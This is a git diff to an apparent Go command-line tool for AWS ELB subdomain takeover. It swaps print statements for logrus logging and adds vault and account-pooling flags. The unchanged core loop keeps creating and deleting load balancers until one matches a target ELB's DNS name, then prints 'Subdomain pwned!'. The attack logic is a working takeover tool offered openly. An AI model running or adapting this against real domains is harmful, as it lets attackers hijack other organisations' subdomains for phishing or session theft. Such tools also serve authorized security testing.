@@ -3,12 +3,12 @@ package main
 import (
 	"flag"
 	"fmt"
-	"log"
 	"net/http"
 	"regexp"
 	"strconv"
 	"time"
 
+	log "github.com/sirupsen/logrus"
 	// AWS libraries
 	"github.com/aws/aws-sdk-go/aws"
 	"github.com/aws/aws-sdk-go/aws/awserr"
@@ -30,9 +30,16 @@ func main() {
 
 	// CLI flags
 	elbPtr := flag.String("elb", "", "the elb to take over - myelb-1234.elb.amazonaws.com")
+	accountPtr := flag.Bool("accountpool", false, "should we use the account Pool from vault")
+	vaultAddressPtr := flag.String("vault", "", "the address of vault to use")
+
 	// Parse flags
 	flag.Parse()
-	fmt.Println(*elbPtr)
+	// We need the vault address if the accountPooling is set to true
+	if *accountPtr == true && *vaultAddressPtr == "" {
+		log.Fatal("You have to specify the vault address if account pooling is enabled")
+	}
+	log.Info(*elbPtr)
 	if *elbPtr == "" {
 		log.Fatal("You have to Specify the ELB")
 	}
@@ -41,17 +48,6 @@ func main() {
 		fmt.Println("ELB created!")
 		fmt.Println("Subdomain pwned!")
 	}
-}
-
-func AwsAccountPooler(count int) (*CreateAccountOutput, error) {
-	// Declaring different metrics
-	// Total number of AWS accounts created
-	var (
-		accountCreated = promauto.NewCounter(prometheus.CounterOpts{
-			Name: "elb_subdomain_taker_aws_accounts_created_total",
-			Help: "The total number of AWS accounts created",
-		})
-	)
 }
 
 func CreateDestroyLoop(elbPtr *string) bool {
@@ -87,7 +83,7 @@ func CreateDestroyLoop(elbPtr *string) bool {
 	// Get the "random" number from the elb
 	NumToFind := string(reNum.FindStringSubmatch(*elbPtr)[1])
 
-	fmt.Println(NumToFind)
+	log.Debug(NumToFind)
 
 	/* All AWS Regions we're matching
 	   us-east-2
@@ -116,7 +112,7 @@ func CreateDestroyLoop(elbPtr *string) bool {
 	// Get the region of the ELB
 	elbRegion := string(reRegion.FindStringSubmatch(*elbPtr)[0])
 
-	fmt.Println(elbRegion)
+	log.Debug(elbRegion)
 
 	// Get the "name" of the ELB that we'll be using to create new ELBs
 	// Define the regex
@@ -124,7 +120,7 @@ func CreateDestroyLoop(elbPtr *string) bool {
 	// Get the name
 	elbName := string(reName.FindStringSubmatch(*elbPtr)[1])
 
-	fmt.Println(elbName)
+	log.Debug(elbName)
 
 	// Now that we have what we're looking for, let's start to create ELBs
 
@@ -145,7 +141,7 @@ func CreateDestroyLoop(elbPtr *string) bool {
 		result := &elb.CreateLoadBalancerOutput{}
 		// Now start to create a new ELB
 		// reference: https://docs.aws.amazon.com/sdk-for-go/api/service/elb/#ELB.CreateLoadBalancer
-		fmt.Println("Creating ELB")
+		log.Info("Creating ELB")
 		input := &elb.CreateLoadBalancerInput{
 			AvailabilityZones: []*string{
 				aws.String(elbRegion + "a"),
@@ -166,46 +162,46 @@ func CreateDestroyLoop(elbPtr *string) bool {
 			if aerr, ok := err.(awserr.Error); ok {
 				switch aerr.Code() {
 				case elb.ErrCodeDuplicateAccessPointNameException:
-					fmt.Println(elb.ErrCodeDuplicateAccessPointNameException, aerr.Error())
+					log.Warning(elb.ErrCodeDuplicateAccessPointNameException, aerr.Error())
 				case elb.ErrCodeTooManyAccessPointsException:
-					fmt.Println(elb.ErrCodeTooManyAccessPointsException, aerr.Error())
+					log.Warning(elb.ErrCodeTooManyAccessPointsException, aerr.Error())
 				case elb.ErrCodeCertificateNotFoundException:
-					fmt.Println(elb.ErrCodeCertificateNotFoundException, aerr.Error())
+					log.Warning(elb.ErrCodeCertificateNotFoundException, aerr.Error())
 				case elb.ErrCodeInvalidConfigurationRequestException:
-					fmt.Println(elb.ErrCodeInvalidConfigurationRequestException, aerr.Error())
+					log.Warning(elb.ErrCodeInvalidConfigurationRequestException, aerr.Error())
 				case elb.ErrCodeSubnetNotFoundException:
-					fmt.Println(elb.ErrCodeSubnetNotFoundException, aerr.Error())
+					log.Warning(elb.ErrCodeSubnetNotFoundException, aerr.Error())
 				case elb.ErrCodeInvalidSubnetException:
-					fmt.Println(elb.ErrCodeInvalidSubnetException, aerr.Error())
+					log.Warning(elb.ErrCodeInvalidSubnetException, aerr.Error())
 				case elb.ErrCodeInvalidSecurityGroupException:
-					fmt.Println(elb.ErrCodeInvalidSecurityGroupException, aerr.Error())
+					log.Warning(elb.ErrCodeInvalidSecurityGroupException, aerr.Error())
 				case elb.ErrCodeInvalidSchemeException:
-					fmt.Println(elb.ErrCodeInvalidSchemeException, aerr.Error())
+					log.Warning(elb.ErrCodeInvalidSchemeException, aerr.Error())
 				case elb.ErrCodeTooManyTagsException:
-					fmt.Println(elb.ErrCodeTooManyTagsException, aerr.Error())
+					log.Warning(elb.ErrCodeTooManyTagsException, aerr.Error())
 				case elb.ErrCodeDuplicateTagKeysException:
-					fmt.Println(elb.ErrCodeDuplicateTagKeysException, aerr.Error())
+					log.Warning(elb.ErrCodeDuplicateTagKeysException, aerr.Error())
 				case elb.ErrCodeUnsupportedProtocolException:
-					fmt.Println(elb.ErrCodeUnsupportedProtocolException, aerr.Error())
+					log.Warning(elb.ErrCodeUnsupportedProtocolException, aerr.Error())
 				case elb.ErrCodeOperationNotPermittedException:
-					fmt.Println(elb.ErrCodeOperationNotPermittedException, aerr.Error())
+					log.Warning(elb.ErrCodeOperationNotPermittedException, aerr.Error())
 				default:
-					fmt.Println(aerr.Error())
+					log.Warning(aerr.Error())
 				}
 			} else {
 				// Print the error, cast err to awserr.Error to get the Code and
 				// Message from an error.
-				fmt.Println(err.Error())
+				log.Warning(err.Error())
 			}
 			// We don't want to return if we have an error, just try again
 			// return false
 		}
 		// Increase elbCreated counter
 		elbCreated.Inc()
-		fmt.Println(result)
+		log.Info(result)
 		randomNumberNew, err := strconv.ParseFloat(reNum.FindStringSubmatch(*result.DNSName)[1], 64)
 		if err != nil {
-			fmt.Println(err)
+			log.Warning(err)
 		}
 		elbRandomNumber.Set(randomNumberNew)
 		if *result.DNSName == *elbPtr {
@@ -213,7 +209,7 @@ func CreateDestroyLoop(elbPtr *string) bool {
 		}
 		// if we have an ELB at this point, we need to delete it to not pile them up
 		if *result.DNSName != "" {
-			fmt.Println("Deleting current ELB:" + *result.DNSName)
+			log.Info("Deleting current ELB:" + *result.DNSName)
 			input := &elb.DeleteLoadBalancerInput{
 				LoadBalancerName: aws.String(elbName),
 			}
@@ -223,24 +219,22 @@ func CreateDestroyLoop(elbPtr *string) bool {
 				if aerr, ok := err.(awserr.Error); ok {
 					switch aerr.Code() {
 					default:
-						fmt.Println(aerr.Error())
+						log.Error(aerr.Error())
 					}
 				} else {
 					// Print the error, cast err to awserr.Error to get the Code and
 					// Message from an error.
-					fmt.Println(err.Error())
+					log.Error(err.Error())
 				}
-				// We don't want to return if we have an error, just try again
-				// return false
 			}
 			// Increase elbDeleted counter if there are no errors and print message
 			if err == nil {
 				elbDeleted.Inc()
-				fmt.Println("Deleted existing ELB successfully")
+				log.Info("Deleted existing ELB successfully")
 			}
 		}
-		fmt.Println("Sleeping before we try again to avoid the rate limit")
+		log.Debug("Sleeping before we try again to avoid the rate limit")
 		time.Sleep(2000 * time.Millisecond)
-		fmt.Println("Next try")
+		log.Debug("Next try")
 	}
 }
